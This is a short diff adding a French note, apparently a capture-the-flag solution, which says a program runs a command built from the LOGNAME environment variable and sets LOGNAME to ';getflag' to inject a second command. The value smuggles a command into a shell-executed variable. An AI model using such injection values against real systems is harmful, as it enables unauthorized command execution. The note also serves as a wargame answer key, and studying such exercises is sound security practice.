@@ -1,0 +1,4 @@
+dans le code ca execute en fonction de la variable d'environnement LOGNAME
+
+export LOGNAME=";getflag"
+
